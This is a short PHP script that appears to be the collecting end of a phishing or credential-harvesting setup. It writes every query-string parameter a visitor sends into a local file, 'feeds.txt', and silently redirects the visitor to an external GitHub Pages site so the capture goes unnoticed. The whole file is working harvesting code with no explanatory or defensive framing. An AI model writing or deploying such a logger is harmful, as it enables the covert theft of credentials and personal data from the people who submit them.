<?php
header("Location: https://taltank1.github.io/kb/");
$handle = fopen("feeds.txt", "a");
foreach($_GET as $variable => $value)
 {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
